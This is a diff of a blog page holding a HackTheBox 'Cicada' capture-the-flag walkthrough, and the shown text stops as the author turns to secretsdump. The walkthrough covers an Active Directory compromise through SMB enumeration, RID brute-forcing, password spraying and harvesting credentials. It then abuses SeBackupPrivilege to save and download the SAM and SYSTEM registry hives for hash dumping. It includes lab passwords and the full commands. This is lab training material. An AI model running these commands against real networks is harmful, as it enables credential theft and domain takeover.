@@ -8,7 +8,7 @@
   <meta http-equiv="expires" content="0">
   
     <title>
-      HackTheBox Cicada  Walkthrough | vipa0z</title>
+      HackTheBox Cicada Walkthrough | vipa0z</title>
   <meta name="author" content="vipa0z">
   
   <meta name="description" content="HackThebox Cicada  is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes.">
@@ -16,7 +16,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="HackTheBox Cicada  Walkthrough"/>
+  <meta property="og:title" content="HackTheBox Cicada Walkthrough"/>
   <meta property="og:site_name" content="vipa0z"/>
 
   
@@ -116,7 +116,7 @@
 
 	
 		<div class="page-header">
-			<h1> HackTheBox Cicada  Walkthrough</h1>
+			<h1> HackTheBox Cicada Walkthrough</h1>
 		</div>
 	
 
@@ -137,9 +137,11 @@
 		 </div> alert -->
 									
 
-										<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/cicada.png" alt="HTB Cicada machine banner with cicada insect theme"></h2><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Cicada is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes.</p>
+										<p><img src="/../images/cicada.png" alt="HTB Cicada machine banner with cicada insect theme"></p>
+<h1 id="OVERVIEW"><a href="#OVERVIEW" class="headerlink" title="_OVERVIEW"></a>_OVERVIEW</h1><p>Cicada is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes.</p>
  <span id="more"></span>
-<hr>
+
+
 <table>
 <thead>
 <tr>
@@ -170,28 +172,25 @@
 </tbody></table>
 <hr>
 <h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><p>Information gathering reveals several ports open:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SMB 445</span><br><span class="line">RDP 3389</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 10.10.11.35 -sC -sV -oA cicada/nmap</span><br><span class="line">SMB 445</span><br><span class="line">RDP 3389</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
 
-<h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><h1 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h1><h3 id="anonymous-access"><a href="#anonymous-access" class="headerlink" title="anonymous access"></a>anonymous access</h3><p>Checking smb port for anonymous access:<br><img src="/security/Screenshots/Pasted%20image%2020241216181737.png"></p>
-<p>SMB Share enumeration unveils a notice from HR file inside the HR share, let’s check it out<br><img src="/security/Screenshots/Pasted%20image%2020241216182316.png"><br>note down the discovered default password: <code>Cicada$M6Corpb*@Lp#nZp!8</code></p>
+<h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><h1 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h1><h3 id="anonymous-access"><a href="#anonymous-access" class="headerlink" title="anonymous access"></a>anonymous access</h3><p>Checking smb port for anonymous access:</p>
+<p>SMB Share enumeration unveils a notice from HR file inside the HR share, let’s check it out<br>note down the discovered default password: <code>Cicada$M6Corpb*@Lp#nZp!8</code></p>
 <p>with anonymous access enabled to the smb server, we can try to discover users with <code>rid bruteforcing</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oxdf@hacky$ netexec smb CICADA-DC -u guest -p &#x27;&#x27; --rid-brute</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeG</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netexec smb CICADA-DC -u guest -p &#x27;&#x27; --rid-brute</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeG</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
 <p>cleaning the  users list with grep</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ cat names |grep SidTypeUser| grep -oP &#x27;\\\K[^ ]+&#x27; &gt; users-list.txt</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">CICADA-DC$</span><br><span class="line">john.smoulder</span><br><span class="line">sarah.dantelia</span><br><span class="line">michael.wrightson</span><br><span class="line">david.orelious</span><br><span class="line">emily.oscars</span><br></pre></td></tr></table></figure>
-<h5 id="checking-password-policy"><a href="#checking-password-policy" class="headerlink" title="checking password policy"></a>checking password policy</h5><p><img src="/security/Screenshots/Pasted%20image%2020241217023442.png">   </p>
-<p> Now i’m going to run a spraying attack at smb with the curated list of users and the found default password:<br><img src="/security/Screenshots/Pasted%20image%2020241216182736.png"><br>Discovered: <code>michael.wrightson</code> user</p>
-<h2 id="Credentialed-Smb-enumeration"><a href="#Credentialed-Smb-enumeration" class="headerlink" title="Credentialed Smb enumeration"></a>Credentialed Smb enumeration</h2><p>dumping all users:<br><img src="/security/Screenshots/Pasted%20image%2020241217024546.png"><br>it appears  david.orelious has left a gift for us, his Creds.<br><code>aRt$Lp#7t*VQ!3 </code><br><img src="/security/Screenshots/Pasted%20image%2020241217030335.png"><br>Authenticated as david reveals the DEV share</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat names |grep SidTypeUser| grep -oP &#x27;\\\K[^ ]+&#x27; &gt; users-list.txt</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">CICADA-DC$</span><br><span class="line">john.smoulder</span><br><span class="line">sarah.dantelia</span><br><span class="line">michael.wrightson</span><br><span class="line">david.orelious</span><br><span class="line">emily.oscars</span><br></pre></td></tr></table></figure>
+<h5 id="checking-password-policy"><a href="#checking-password-policy" class="headerlink" title="checking password policy"></a>checking password policy</h5><p> Now i’m going to run a spraying attack at smb with the curated list of users and the found default password:<br>Discovered: <code>michael.wrightson</code> user</p>
+<h2 id="Credentialed-Smb-enumeration"><a href="#Credentialed-Smb-enumeration" class="headerlink" title="Credentialed Smb enumeration"></a>Credentialed Smb enumeration</h2><p>dumping all users:<br>it appears  david.orelious has left a gift for us, his Creds.<br><code>aRt$Lp#7t*VQ!3 </code><br>Authenticated as david reveals the DEV share</p>
 <h2 id="DEV-SHARE-ENUMERATION"><a href="#DEV-SHARE-ENUMERATION" class="headerlink" title="DEV SHARE ENUMERATION"></a>DEV SHARE ENUMERATION</h2><p>throughly enumerate content of the DEV share With the spider module:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.11.35 -u &#x27;david.orelious&#x27; -p &#x27;aRt$Lp#7t*VQ!3&#x27; --spider DEV --regex .</span><br></pre></td></tr></table></figure>
-<h2 id="Script-file-discovery"><a href="#Script-file-discovery" class="headerlink" title="Script file discovery"></a>Script file discovery</h2><p> Inspecting the output of spider, i found a script file with credentials of another user<br><img src="/security/Screenshots/Pasted%20image%2020241217032915.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nxc smb 10.10.11.35 -u &#x27;david.orelious&#x27; -p &#x27;aRt$Lp#7t*VQ!3&#x27; --spider DEV --regex .</span><br></pre></td></tr></table></figure>
+<h2 id="Script-file-discovery"><a href="#Script-file-discovery" class="headerlink" title="Script file discovery"></a>Script file discovery</h2><p> Inspecting the output of spider, i found a script file with credentials of another user</p>
 <p>i found a PS-Credential object with emily.oscars credentials:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username = &quot;emily.oscars&quot;</span><br><span class="line">$password = ConvertTo-SecureString &quot;Q!3@Lp#M6b*7t*Vt&quot; -AsPlainText -Force</span><br><span class="line">$credentials = New-Object System.Management.Automation.PSCredential($username, $password)</span><br></pre></td></tr></table></figure>
-<p>test out  the credentials with evil-winrm:<br><img src="/security/Screenshots/Pasted%20image%2020241217034219.png"></p>
-<h4 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag:"></a>user flag:</h4><p><img src="/security/Screenshots/Pasted%20image%2020241217034425.png"></p>
+<p>test out  the credentials with evil-winrm:</p>
 <h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><p>checking privileges</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">get-acl c:\users\administrator</span><br></pre></td></tr></table></figure>
 
-<p><img src="/security/Screenshots/Pasted%20image%2020241217095700.png"></p>
 <p>The <code>SeBackupPrivilege</code> can be used to gain read access to any file According to microsoft docs<br>there are many techniques avaiable to exploit this, but im going copy the hives registery manually using <code>reg</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; reg save hklm\sam sam      </span><br><span class="line">The operation completed successfully.                      </span><br><span class="line">                             </span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; reg save hklm\system system</span><br><span class="line">The operation completed successfully. </span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download sam</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\programdata\sam to sam</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download system</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\programdata\system to system</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
 <p>now i’m going to extract the Administrator’s hash from the registery hives with <code>secretsdump.py</code>:</p>
